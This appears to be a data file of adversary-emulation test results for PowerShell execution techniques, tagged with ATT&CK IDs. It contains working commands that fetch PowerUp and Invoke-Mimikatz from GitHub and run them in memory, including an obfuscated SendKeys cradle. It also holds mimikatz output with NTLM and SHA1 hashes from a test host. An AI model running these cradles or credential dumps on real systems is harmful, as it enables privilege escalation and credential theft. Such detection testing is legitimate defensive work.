Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      Modifiable Services                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      %PATH% .dll Hijacks                      Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          Modifiable Scheduled Task Files          '],[''],['0'],['[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks'],['Check for privilege escalation paths using PowerUp from PowerShellMafia\n'],['PowerUp Invoke-AllChecks'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
457,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['PowerShell Invoke Known Malicious Cmdlets'],execution :: T1059.001,operation__atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__a9df2530a06e1aa7d1ba9e9309364b9f__SAVED_2024-03-07_040556,atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__a9df2530a06e1aa7d1ba9e9309364b9f,['a9df2530a06e1aa7d1ba9e9309364b9f'],1,0,1,[1],['function Add-Persistence { Write-Host Pretending to invoke Add-Persistence }function Find-AVSignature { Write-Host Pretending to invoke Find-AVSignature }function Get-GPPAutologon { Write-Host Pretending to invoke Get-GPPAutologon }function Get-GPPPassword { Write-Host Pretending to invoke Get-GPPPassword }function Get-HttpStatus { Write-Host Pretending to invoke Get-HttpStatus }function Get-Keystrokes { Write-Host Pretending to invoke Get-Keystrokes }function Get-SecurityPackages { Write-Host Pretending to invoke Get-SecurityPackages }function Get-TimedScreenshot { Write-Host Pretending to invoke Get-TimedScreenshot }function Get-VaultCredential { Write-Host Pretending to invoke Get-VaultCredential }function Get-VolumeShadowCopy { Write-Host Pretending to invoke Get-VolumeShadowCopy }function Install-SSP { Write-Host Pretending to invoke Install-SSP }function Invoke-CredentialInjection { Write-Host Pretending to invoke Invoke-CredentialInjection }function Invoke-DllInjection { Write-Host Pretending to invoke Invoke-DllInjection }function Invoke-Mimikatz { Write-Host Pretending to invoke Invoke-Mimikatz }function Invoke-NinjaCopy { Write-Host Pretending to invoke Invoke-NinjaCopy }function Invoke-Portscan { Write-Host Pretending to invoke Invoke-Portscan }function Invoke-ReflectivePEInjection { Write-Host Pretending to invoke Invoke-ReflectivePEInjection }function Invoke-ReverseDnsLookup { Write-Host Pretending to invoke Invoke-ReverseDnsLookup }function Invoke-Shellcode { Write-Host Pretending to invoke Invoke-Shellcode }function Invoke-TokenManipulation { Write-Host Pretending to invoke Invoke-TokenManipulation }function Invoke-WmiCommand { Write-Host Pretending to invoke Invoke-WmiCommand }function Mount-VolumeShadowCopy { Write-Host Pretending to invoke Mount-VolumeShadowCopy }function New-ElevatedPersistenceOption { Write-Host Pretending to invoke New-ElevatedPersistenceOption }function New-UserPersistenceOption { Write-Host Pretending to invoke New-UserPersistenceOption }function New-VolumeShadowCopy { Write-Host Pretending to invoke New-VolumeShadowCopy }function Out-CompressedDll { Write-Host Pretending to invoke Out-CompressedDll }function Out-EncodedCommand { Write-Host Pretending to invoke Out-EncodedCommand }function Out-EncryptedScript { Write-Host Pretending to invoke Out-EncryptedScript }function Out-Minidump { Write-Host Pretending to invoke Out-Minidump }function PowerUp { Write-Host Pretending to invoke PowerUp }function PowerView { Write-Host Pretending to invoke PowerView }function Remove-Comments { Write-Host Pretending to invoke Remove-Comments }function Remove-VolumeShadowCopy { Write-Host Pretending to invoke Remove-VolumeShadowCopy }function Set-CriticalProcess { Write-Host Pretending to invoke Set-CriticalProcess }function Set-MasterBootRecord { Write-Host Pretending to invoke Set-MasterBootRecord }Add-PersistenceFind-AVSignatureGet-GPPAutologonGet-GPPPasswordGet-HttpStatusGet-KeystrokesGet-SecurityPackagesGet-TimedScreenshotGet-VaultCredentialGet-VolumeShadowCopyInstall-SSPInvoke-CredentialInjectionInvoke-DllInjectionInvoke-MimikatzInvoke-NinjaCopyInvoke-PortscanInvoke-ReflectivePEInjectionInvoke-ReverseDnsLookupInvoke-ShellcodeInvoke-TokenManipulationInvoke-WmiCommandMount-VolumeShadowCopyNew-ElevatedPersistenceOptionNew-UserPersistenceOptionNew-VolumeShadowCopyOut-CompressedDllOut-EncodedCommandOut-EncryptedScriptOut-MinidumpPowerUpPowerViewRemove-CommentsRemove-VolumeShadowCopySet-CriticalProcessSet-MasterBootRecord'],[''],['0'],"['$malcmdlets = ""Add-Persistence"", ""Find-AVSignature"", ""Get-GPPAutologon"", ""Get-GPPPassword"", ""Get-HttpStatus"", ""Get-Keystrokes"", ""Get-SecurityPackages"", ""Get-TimedScreenshot"", ""Get-VaultCredential"", ""Get-VolumeShadowCopy"", ""Install-SSP"", ""Invoke-CredentialInjection"", ""Invoke-DllInjection"", ""Invoke-Mimikatz"", ""Invoke-NinjaCopy"", ""Invoke-Portscan"", ""Invoke-ReflectivePEInjection"", ""Invoke-ReverseDnsLookup"", ""Invoke-Shellcode"", ""Invoke-TokenManipulation"", ""Invoke-WmiCommand"", ""Mount-VolumeShadowCopy"", ""New-ElevatedPersistenceOption"", ""New-UserPersistenceOption"", ""New-VolumeShadowCopy"", ""Out-CompressedDll"", ""Out-EncodedCommand"", ""Out-EncryptedScript"", ""Out-Minidump"", ""PowerUp"", ""PowerView"", ""Remove-Comments"", ""Remove-VolumeShadowCopy"", ""Set-CriticalProcess"", ""Set-MasterBootRecord""; foreach ($cmdlets in $malcmdlets) {;     ""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}']",['Powershell execution of known Malicious PowerShell Cmdlets'],['PowerShell Invoke Known Malicious Cmdlets'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
459,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['Mimikatz - Cradlecraft PsSendKeys'],execution :: T1059.001,operation__atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__90c76bd616efee6d7c98dc6c1dcc6e99__SAVED_2024-03-07_035240,atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__90c76bd616efee6d7c98dc6c1dcc6e99,['90c76bd616efee6d7c98dc6c1dcc6e99'],1,0,1,[1],"['  .#####.   mimikatz 2.2.0 (x64) #18362 Oct 30 2019 13:01:25 .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 127290 (00000000:0001f13a)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 127247 (00000000:0001f10f)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 77890 (00000000:00013042)Session           : Batch from 0User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-19\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tkerberos :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 55583 (00000000:0000d91f)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 55226 (00000000:0000d7ba)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-20\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 33712 (00000000:000083b0)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 33679 (00000000:0000838f)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-0\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 32502 (00000000:00007ef6)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : \tmsv :\t\ttspkg :\t\twdigest :\t\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-18\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\tKO\tcredman :\tmimikatz(powershell) # exitBye!']",[''],['0'],"[""$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr""]","['Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n']",['Mimikatz - Cradlecraft PsSendKeys'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
